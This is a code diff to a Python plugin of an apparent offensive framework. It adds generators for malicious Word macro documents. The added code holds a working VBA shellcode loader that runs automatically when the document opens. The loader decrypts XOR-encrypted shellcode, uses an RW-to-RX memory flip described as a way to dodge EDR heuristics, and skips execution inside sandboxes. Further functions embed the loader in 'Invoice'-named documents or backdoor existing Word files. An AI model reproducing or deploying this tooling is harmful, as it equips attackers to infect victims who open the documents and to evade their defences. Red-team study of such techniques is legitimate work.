@@ -62,6 +62,10 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             "register_xll_function": self.register_xll_function,
             "export_vba_as_bas": self.export_vba_as_bas,
             "export_vba_as_text": self.export_vba_as_text,
+            # Word document loaders (.docm / .doc)
+            "generate_word_vba_loader": self.generate_word_vba_loader,
+            "generate_word_payload": self.generate_word_payload,
+            "backdoor_existing_word": self.backdoor_existing_word,
         }
 
     def validate(self):
@@ -2044,6 +2048,488 @@ __declspec(dllexport) LPXLOPER __cdecl {function_name}(void) {{
         return registration_code
 
 
+    # ------------------------------------------------------------------
+    # Word Document (.docm / .doc) methods
+    # ------------------------------------------------------------------
+
+    def _wrap_with_document_open(self, vba_code: str) -> str:
+        """Prepend a Document_Open() stub that calls the same entry as AutoOpen().
+
+        Existing Excel loaders only emit AutoOpen; Word also fires Document_Open
+        on explicit open (e.g. double-click from Explorer). Both fire on Open so
+        keeping both maximises coverage.
+        """
+        import re
+        m = re.search(r'Sub\s+(AutoOpen)\s*\(\)', vba_code)
+        if not m:
+            return vba_code
+        entry = m.group(1)
+        stub = f"\nSub Document_Open()\n    Call {entry}()\nEnd Sub\n"
+        return stub + vba_code
+
+    def _generate_word_loader_createthread_rwrx(self, vba_shellcode: str) -> str:
+        """Improved Word createthread loader.
+
+        Improvements over the PEN-300 baseline (Listing 50):
+        - Allocate PAGE_READWRITE (0x04) only; flip to PAGE_EXECUTE_READ (0x20)
+          via VirtualProtect after copy.  Avoids persistent RWX allocation which
+          is the primary EDR allocation heuristic.
+        - Zero source buffer (buf array) immediately after copy to reduce
+          forensic artefacts on the Word process heap.
+        - GetTickCount sandbox gate: abort if system uptime < 5 min.
+        - WaitForSingleObject + CloseHandle for proper thread lifecycle.
+        - Both Document_Open and AutoOpen triggers for Word coverage.
+        """
+        chunked_shellcode = self.chunk_shellcode_array(vba_shellcode, max_line_length=200)
+
+        return f'''
+Option Explicit
+
+' --- Win32 API declarations ---
+
+' Allocate RW region first — never RWX on initial alloc
+Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
+    ByVal lpAddress        As LongPtr, _
+    ByVal dwSize           As Long,    _
+    ByVal flAllocationType As Long,    _
+    ByVal flProtect        As Long)    As LongPtr
+
+' Flip RW -> RX after shellcode copy (PAGE_EXECUTE_READ = 0x20)
+Private Declare PtrSafe Function VirtualProtect Lib "kernel32" ( _
+    ByVal lpAddress    As LongPtr, _
+    ByVal dwSize       As Long,    _
+    ByVal flNewProtect As Long,    _
+    ByRef lpOldProtect As Long)    As Long
+
+Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
+    ByVal lDst  As LongPtr, _
+    ByRef sSrc  As Any,     _
+    ByVal lLen  As Long)    As LongPtr
+
+Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
+    ByVal SecAttr     As Long,    _
+    ByVal StackSize   As Long,    _
+    ByVal StartFunc   As LongPtr, _
+    ByVal ThreadParam As LongPtr, _
+    ByVal CreateFlags As Long,    _
+    ByRef ThreadId    As Long)    As LongPtr
+
+Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
+    ByVal hHandle        As LongPtr, _
+    ByVal dwMilliseconds As Long)    As Long
+
+Private Declare PtrSafe Function CloseHandle Lib "kernel32" ( _
+    ByVal hObject As LongPtr) As Long
+
+' Uptime in ms — sandbox gate
+Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
+
+' --- Auto-exec triggers (both for Word coverage) ---
+
+Sub Document_Open()
+    On Error Resume Next
+    Call ExecuteShellcode()
+End Sub
+
+Sub AutoOpen()
+    On Error Resume Next
+    Call ExecuteShellcode()
+End Sub
+
+' --- Array helpers (shared with Excel loaders) ---
+
+Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
+    Dim combined() As Variant
+    Dim i As Long, j As Long
+    Dim size1 As Long, size2 As Long
+    size1 = UBound(arr1) - LBound(arr1) + 1
+    size2 = UBound(arr2) - LBound(arr2) + 1
+    ReDim combined(0 To size1 + size2 - 1)
+    For i = 0 To size1 - 1
+        combined(i) = arr1(LBound(arr1) + i)
+    Next i
+    For j = 0 To size2 - 1
+        combined(size1 + j) = arr2(LBound(arr2) + j)
+    Next j
+    ConcatenateArrays = combined
+End Function
+
+Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
+    Dim decrypted() As Byte
+    Dim i As Long
+    Dim keyLen As Long
+    keyLen = UBound(key) - LBound(key) + 1
+    ReDim decrypted(LBound(encrypted) To UBound(encrypted))
+    For i = LBound(encrypted) To UBound(encrypted)
+        decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
+    Next i
+    XorDecrypt = decrypted
+End Function
+
+' --- Sandbox gate ---
+
+Private Function SandboxDetected() As Boolean
+    SandboxDetected = False
+    ' Abort if system uptime < 5 minutes (freshly spun sandbox VM)
+    If GetTickCount() < 300000 Then
+        SandboxDetected = True
+        Exit Function
+    End If
+End Function
+
+' --- Core loader ---
+
+Sub ExecuteShellcode()
+    On Error Resume Next
+
+    If SandboxDetected() Then Exit Sub
+
+    Dim shellcode As Variant
+    Dim key As Variant
+    Dim addr As LongPtr
+    Dim hThread As LongPtr
+    Dim threadId As Long
+    Dim scLen As Long
+    Dim oldProt As Long
+    Dim decrypted As Variant
+    Dim i As Long
+
+    {chunked_shellcode}
+
+    decrypted = XorDecrypt(shellcode, key)
+    scLen = UBound(decrypted) - LBound(decrypted) + 1
+
+    ' Alloc RW only (PAGE_READWRITE = 0x04, MEM_COMMIT|MEM_RESERVE = 0x3000)
+    addr = VirtualAlloc(0, scLen, &H3000, &H4)
+    If addr = 0 Then Exit Sub
+
+    ' Copy shellcode byte-by-byte into RW allocation
+    For i = LBound(decrypted) To UBound(decrypted)
+        RtlMoveMemory addr + i, decrypted(i), 1
+    Next i
+
+    ' Zero source buffer to remove plaintext from Word heap
+    For i = LBound(decrypted) To UBound(decrypted)
+        decrypted(i) = 0
+    Next i
+
+    ' Flip RW -> RX (PAGE_EXECUTE_READ = 0x20)
+    If VirtualProtect(addr, scLen, &H20, oldProt) = 0 Then Exit Sub
+
+    hThread = CreateThread(0, 0, addr, 0, 0, threadId)
+
+    If hThread <> 0 Then
+        WaitForSingleObject hThread, &HFFFFFFFF
+        CloseHandle hThread
+    End If
+End Sub
+'''
+
+    def generate_word_vba_loader(self, vba_shellcode, trigger_type="AutoOpen",
+                                  loader_type="createthread",
+                                  target_process="C:\\Windows\\System32\\notepad.exe"):
+        """Generate VBA shellcode loader for Word documents (.docm/.doc).
+
+        Uses Document_Open + AutoOpen dual triggers.
+        createthread variant uses the improved RW→RX allocation pattern with
+        VirtualProtect and source buffer zeroing.  Other techniques delegate to
+        the existing Excel generators and prepend a Document_Open wrapper.
+
+        Args:
+            vba_shellcode: shellcode in VBA array format (from shellcrypt -f vba)
+            trigger_type:  AutoOpen (ignored for createthread — both triggers always emitted)
+            loader_type:   createthread | enumlocales | queueuserapc | hollowing
+            target_process: target for hollowing technique
+
+        Returns:
+            str: complete VBA module ready to embed in a Word document
+        """
+        if loader_type == "createthread":
+            return self._generate_word_loader_createthread_rwrx(vba_shellcode)
+        elif loader_type == "enumlocales":
+            return self._wrap_with_document_open(
+                self.generate_vba_loader_enumlocales(vba_shellcode, trigger_type)
+            )
+        elif loader_type == "queueuserapc":
+            return self._wrap_with_document_open(
+                self.generate_vba_loader_queueuserapc(vba_shellcode, trigger_type)
+            )
+        elif loader_type == "hollowing":
+            return self._wrap_with_document_open(
+                self.generate_vba_loader_process_hollowing(vba_shellcode, trigger_type, target_process)
+            )
+        else:
+            return self._generate_word_loader_createthread_rwrx(vba_shellcode)
+
+    def _resolve_word_template_path(self, output_path):
+        """Locate template.docm (or template.doc) in the templates directory.
+
+        Search order:
+        1. agent_code/templates/
+        2. erebus/templates/  (legacy fallback)
+
+        Returns Path or None.
+        """
+        output_path = Path(output_path)
+        ext = output_path.suffix.lower()
+        template_name = "template.docm" if ext != ".doc" else "template.doc"
+
+        repo_root = Path(__file__).resolve().parents[2]
+        candidates = [
+            repo_root / "agent_code" / "templates" / template_name,
+            Path(__file__).resolve().parent.parent / "templates" / template_name,
+        ]
+        for candidate in candidates:
+            if candidate.exists():
+                return candidate
+        return None
+
+    def _inject_vba_into_word(self, word_path, vba_code):
+        """Inject VBA into a .docm ZIP archive (word/vbaProject.bin).
+
+        Mirror of _inject_vba_into_excel but with Word-specific paths:
+        - Relationships: word/_rels/document.xml.rels
+        - VBA binary:    word/vbaProject.bin
+        - Content type:  application/vnd.ms-office.vbaProject
+        """
+        libs = self._get_excel_libs()
+        zipfile_mod = libs['zipfile']
+        ET = libs['ET']
+        import tempfile
+        import shutil
+        import os
+
+        word_path = Path(word_path)
+        temp_dir = Path(tempfile.mkdtemp())
+
+        try:
+            with zipfile_mod.ZipFile(str(word_path), 'r') as zf:
+                zf.extractall(str(temp_dir))
+
+            ns_rels = 'http://schemas.openxmlformats.org/package/2006/relationships'
+            vba_rel_type = 'http://schemas.microsoft.com/office/2006/relationships/vbaProject'
+
+            # Update word/_rels/document.xml.rels
+            rels_path = temp_dir / "word" / "_rels" / "document.xml.rels"
+            if rels_path.exists():
+                try:
+                    tree = ET.parse(str(rels_path))
+                    root = tree.getroot()
+                    vba_rel_exists = any(
+                        'vbaProject' in rel.get('Target', '')
+                        for rel in root.findall('{%s}Relationship' % ns_rels)
+                    )
+                    if not vba_rel_exists:
+                        existing_ids = [
+                            int(r.get('Id', 'rId0').replace('rId', ''))
+                            for r in root.findall('{%s}Relationship' % ns_rels)
+                            if r.get('Id', '').startswith('rId')
+                        ]
+                        next_id = max(existing_ids, default=0) + 1
+                        new_rel = ET.Element('{%s}Relationship' % ns_rels)
+                        new_rel.set('Id', f'rId{next_id}')
+                        new_rel.set('Type', vba_rel_type)
+                        new_rel.set('Target', 'vbaProject.bin')
+                        root.append(new_rel)
+                        tree.write(str(rels_path), encoding='utf-8', xml_declaration=True)
+                except Exception:
+                    pass
+
+            # Update [Content_Types].xml
+            ct_path = temp_dir / "[Content_Types].xml"
+            if ct_path.exists():
+                try:
+                    ns_ct = 'http://schemas.openxmlformats.org/package/2006/content-types'
+                    tree = ET.parse(str(ct_path))
+                    root = tree.getroot()
+                    vba_ct_exists = any(
+                        'vbaProject.bin' in ov.get('PartName', '')
+                        for ov in root.findall('{%s}Override' % ns_ct)
+                    )
+                    if not vba_ct_exists:
+                        new_ov = ET.Element('{%s}Override' % ns_ct)
+                        new_ov.set('PartName', '/word/vbaProject.bin')
+                        new_ov.set('ContentType', 'application/vnd.ms-office.vbaProject')
+                        root.append(new_ov)
+                        tree.write(str(ct_path), encoding='utf-8', xml_declaration=True)
+                except Exception:
+                    pass
+
+            # Write compiled VBA project
+            word_dir = temp_dir / "word"
+            word_dir.mkdir(exist_ok=True)
+            vba_bin_path = word_dir / "vbaProject.bin"
+            vba_bin_path.write_bytes(self._create_vbaproject_with_code(vba_code))
+
+            # Repack
+            if word_path.exists():
+                word_path.unlink()
+            with zipfile_mod.ZipFile(str(word_path), 'w', zipfile_mod.ZIP_DEFLATED) as zf:
+                for root_sub, _, files_sub in os.walk(str(temp_dir)):
+                    for fname in files_sub:
+                        fp = Path(root_sub) / fname
+                        arcname = str(fp.relative_to(temp_dir)).replace('\\', '/')
+                        zf.write(str(fp), arcname)
+        finally:
+            shutil.rmtree(str(temp_dir), ignore_errors=True)
+
+    def create_new_word_with_payload(self, output_path, vba_code, document_name="Invoice",
+                                      template_path=None):
+        """Create a new .docm Word document with embedded VBA payload.
+
+        Uses a template.docm if available; otherwise creates a minimal
+        ZIP-based .docm from scratch.
+
+        Args:
+            output_path:   destination file path (.docm or .doc)
+            vba_code:      VBA source to embed
+            document_name: used for fallback document content
+            template_path: optional explicit template path
+
+        Returns:
+            Path: path to created document
+        """
+        output_path = Path(output_path)
+        output_path.parent.mkdir(parents=True, exist_ok=True)
+
+        if template_path is None:
+            template_path = self._resolve_word_template_path(output_path)
+
+        if template_path and Path(template_path).exists():
+            return self._create_word_from_template(output_path, vba_code, Path(template_path))
+
+        # Fallback: build a minimal .docm from scratch
+        return self._create_word_scratch(output_path, vba_code, document_name)
+
+    def _create_word_from_template(self, output_path, vba_code, template_path):
+        """Copy template.docm and inject VBA."""
+        import shutil
+        output_path = Path(output_path)
+        template_path = Path(template_path)
+        if not template_path.exists():
+            raise FileNotFoundError(f"Word template not found: {template_path}")
+        shutil.copy(str(template_path), str(output_path))
+        self._inject_vba_into_word(str(output_path), vba_code)
+        return output_path
+
+    def _create_word_scratch(self, output_path, vba_code, document_name="Invoice"):
+        """Build a minimal .docm ZIP from scratch and inject VBA.
+
+        Produces the smallest valid Open XML Word document that Excel will
+        open without complaint.  Real-world delivery should use a template.
+        """
+        import zipfile as zf_mod
+        import io
+
+        output_path = Path(output_path)
+
+        # Minimal document.xml
+        doc_xml = (
+            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+            '<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas"'
+            ' xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
+            '<w:body><w:p><w:r><w:t>' + document_name + '</w:t></w:r></w:p></w:body>'
+            '</w:document>'
+        )
+
+        content_types = (
+            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
+            '<Default Extension="xml" ContentType="application/xml"/>'
+            '<Override PartName="/word/document.xml"'
+            ' ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
+            '<Override PartName="/word/vbaProject.bin"'
+            ' ContentType="application/vnd.ms-office.vbaProject"/>'
+            '</Types>'
+        )
+
+        rels = (
+            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+            '<Relationship Id="rId1"'
+            ' Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"'
+            ' Target="word/document.xml"/>'
+            '</Relationships>'
+        )
+
+        word_rels = (
+            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+            '<Relationship Id="rId1"'
+            ' Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject"'
+            ' Target="vbaProject.bin"/>'
+            '</Relationships>'
+        )
+
+        vba_bin = self._create_vbaproject_with_code(vba_code)
+
+        buf = io.BytesIO()
+        with zf_mod.ZipFile(buf, 'w', zf_mod.ZIP_DEFLATED) as zf:
+            zf.writestr('[Content_Types].xml', content_types)
+            zf.writestr('_rels/.rels', rels)
+            zf.writestr('word/document.xml', doc_xml)
+            zf.writestr('word/_rels/document.xml.rels', word_rels)
+            zf.writestr('word/vbaProject.bin', vba_bin)
+
+        output_path.write_bytes(buf.getvalue())
+        return output_path
+
+    def backdoor_word_document(self, source_path, output_path, vba_code):
+        """Backdoor an existing Word document by injecting VBA.
+
+        Args:
+            source_path: path to source .docm file
+            output_path: destination for the backdoored file
+            vba_code:    VBA source to inject
+
+        Returns:
+            Path: path to backdoored document
+        """
+        import shutil
+        source_path = Path(source_path)
+        output_path = Path(output_path)
+        output_path.parent.mkdir(parents=True, exist_ok=True)
+        shutil.copy2(str(source_path), str(output_path))
+        self._inject_vba_into_word(str(output_path), vba_code)
+        return output_path
+
+    def generate_word_payload(self, payload_path, vba_payload, output_path=None,
+                               template_path=None, doc_format="docm"):
+        """Registered: create a Word document with embedded VBA payload.
+
+        Args:
+            payload_path:  unused (kept for API symmetry with generate_excel_payload)
+            vba_payload:   VBA source
+            output_path:   destination path (extension determines format)
+            template_path: optional explicit template
+            doc_format:    "docm" or "doc" (used when output_path has no extension)
+
+        Returns:
+            Path: path to generated document
+        """
+        if output_path is None:
+            output_path = Path(f"malicious_document.{doc_format}")
+        return self.create_new_word_with_payload(output_path, vba_payload,
+                                                  template_path=template_path)
+
+    def backdoor_existing_word(self, source_word, vba_payload, output_path=None):
+        """Registered: backdoor an existing Word file with VBA payload.
+
+        Args:
+            source_word:  path to source Word document
+            vba_payload:  VBA source to inject
+            output_path:  destination path (optional)
+
+        Returns:
+            Path: path to backdoored document
+        """
+        if output_path is None:
+            src = Path(source_word)
+            output_path = src.parent / f"{src.stem}_backdoored{src.suffix}"
+        return self.backdoor_word_document(source_word, output_path, vba_payload)
+
+
 # Instantiate plugin
 _plugin = PayloadMalDocsPlugin()
 
@@ -2075,6 +2561,19 @@ def generate_xll_template(shellcode_hex, encryption_type="XOR", injection_method
 def register_xll_function(function_name, function_macro):
     """Register an XLL function for Excel."""
     return _plugin.register_xll_function(function_name, function_macro)
+
+def generate_word_payload(payload_path, vba_payload, output_path=None, template_path=None, doc_format="docm"):
+    """Generate a Word document (.docm/.doc) with embedded VBA payload."""
+    return _plugin.generate_word_payload(payload_path, vba_payload, output_path, template_path, doc_format)
+
+def backdoor_existing_word(source_word, vba_payload, output_path=None):
+    """Backdoor an existing Word document with VBA payload."""
+    return _plugin.backdoor_existing_word(source_word, vba_payload, output_path)
+
+def generate_word_vba_loader(vba_shellcode, trigger_type="AutoOpen", loader_type="createthread",
+                              target_process="C:\\Windows\\System32\\notepad.exe"):
+    """Generate Word-optimized VBA shellcode loader."""
+    return _plugin.generate_word_vba_loader(vba_shellcode, trigger_type, loader_type, target_process)
 
 
 # Test block for standalone execution
